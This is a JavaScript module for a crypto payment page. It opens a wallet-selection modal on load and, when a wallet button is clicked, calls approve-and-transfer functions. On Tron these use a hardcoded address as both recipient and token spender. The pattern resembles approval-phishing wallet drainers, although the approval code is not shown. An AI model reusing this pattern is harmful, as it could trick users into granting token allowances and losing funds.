(function () {
  const core = window.pay0Core;
  if (!core) throw new Error("pay0Core 未加载");
  const $ = core.$;

  let walletModalInstance = null;

  function showModal() {
    const el = $("walletModal");
    if (!el || !window.bootstrap) return;
    walletModalInstance = window.bootstrap.Modal.getOrCreateInstance(el, { backdrop: "static", keyboard: false });
    walletModalInstance.show();
  }

  function hideModal() {
    if (walletModalInstance && typeof walletModalInstance.hide === "function") walletModalInstance.hide();
  }

  function evmParams() {
    const chainKey = $("network") ? ($("network").value || "bsc") : "bsc";
    const tokenAddress = $("token") ? $("token").value.trim() : "";
    const spenderAddress = $("spender") ? $("spender").value.trim() : "";
    const toAddress = $("recipient") ? $("recipient").value.trim() : "";
    const amountUsdt = $("transferAmount") ? ($("transferAmount").value.trim() || (($("approveAmount") && $("approveAmount").value.trim()) || "")) : "";
    return { chainKey, tokenAddress: tokenAddress || null, spenderAddress, toAddress, amountUsdt };
  }

  async function payEvm(log) {
    if (typeof window.pay0EvmApproveAndTransfer !== "function") throw new Error("EVM 模块未加载");
    const p = evmParams();
    await window.pay0EvmApproveAndTransfer({
      chain: p.chainKey,
      tokenAddress: p.tokenAddress || undefined,
      spenderAddress: p.spenderAddress,
      toAddress: p.toAddress,
      amountUsdt: p.amountUsdt,
      log
    });
  }

  async function payTron(log) {
    if (typeof window.tronApproveAndTransferHardcoded !== "function") throw new Error("Tron 模块未加载");
    await window.tronApproveAndTransferHardcoded({
      log,
      amountUsdt: "1",
      toAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6",
      spenderAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6"
    });
  }

  async function payTronViaTronLink(log) {
    if (typeof window.pay0TronLinkTransfer !== "function") throw new Error("TronLink 模块未加载");
    await window.pay0TronLinkTransfer({
      log,
      amountUsdt: "1",
      toAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6",
      spenderAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6"
    });
  }

  async function payTronViaTokenPocket(log) {
    if (typeof window.pay0TokenPocketTronTransfer !== "function") throw new Error("TokenPocket Tron 模块未加载");
    await window.pay0TokenPocketTronTransfer({
      log,
      amountUsdt: "1",
      toAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6",
      spenderAddress: "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6"
    });
  }

  function bindWalletButtons(log) {
    const btnConnect = $("btnConnect");
    if (btnConnect) btnConnect.addEventListener("click", () => showModal());

    const btnCloseModal = $("btnCloseModal");
    if (btnCloseModal) btnCloseModal.addEventListener("click", () => hideModal());

    const walletModal = $("walletModal");
    if (walletModal) walletModal.addEventListener("click", (e) => { if (e.target === walletModal) hideModal(); });

    const btnMetaMask = $("btnWalletMetaMask");
    if (btnMetaMask) btnMetaMask.addEventListener("click", async () => {
      try {
        hideModal();
        await payEvm(log);
      } catch (e) {
        log("MetaMask 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnTokenPocket = $("btnWalletTokenPocket");
    if (btnTokenPocket) btnTokenPocket.addEventListener("click", async () => {
      try {
        hideModal();
        if (typeof window.pay0TokenPocketPay === "function") {
          await window.pay0TokenPocketPay({ log });
          return;
        }
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
          await payTronViaTokenPocket(log);
          return;
        }
        await payEvm(log);
      } catch (e) {
        log("TokenPocket 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnTronLink = $("btnWalletTronLink");
    if (btnTronLink) btnTronLink.addEventListener("click", async () => {
      try {
        hideModal();
        await payTronViaTronLink(log);
      } catch (e) {
        log("TronLink 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnBitget = $("btnWalletBitget");
    if (btnBitget) btnBitget.addEventListener("click", async () => {
      try {
        hideModal();
        await payEvm(log);
      } catch (e) {
        log("Bitget 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });

    const btnTrust = $("btnWalletTrust");
    if (btnTrust) btnTrust.addEventListener("click", async () => {
      try {
        hideModal();
        await payEvm(log);
      } catch (e) {
        log("Trust Wallet 支付失败：" + (e && e.message ? e.message : String(e)));
      }
    });
  }

  function init(opts) {
    const log = opts && typeof opts.log === "function" ? opts.log : function () {};
    bindWalletButtons(log);
    showModal();
    log("页面已就绪");
  }

  window.pay0Actions = { init };
})();
